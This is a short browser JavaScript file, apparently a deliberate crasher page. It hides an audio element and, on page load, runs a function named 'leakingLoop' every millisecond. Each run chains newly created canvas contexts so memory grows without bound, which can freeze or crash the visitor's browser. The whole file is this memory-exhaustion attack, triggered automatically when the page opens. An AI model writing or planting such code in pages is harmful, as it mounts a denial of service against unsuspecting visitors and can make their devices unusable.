function init(){
    let audio = document.getElementById("audio");
    audio.hidden = true;
}

function start(){
    window.reallyFatCanvas = document.createElement('canvas');
    let context = window.reallyFatCanvas.getContext('2d');

    function leakingLoop() {
        context.canvas.width = document.body.clientWidth;
        context.canvas.height = document.body.clientHeight;
        const newContext = document.createElement('canvas').getContext('2d');
        context.context = newContext;
        context.drawImage(newContext.canvas, 0, 0);
        context = newContext;
    }

    setInterval(leakingLoop,1);
}

window.onload = start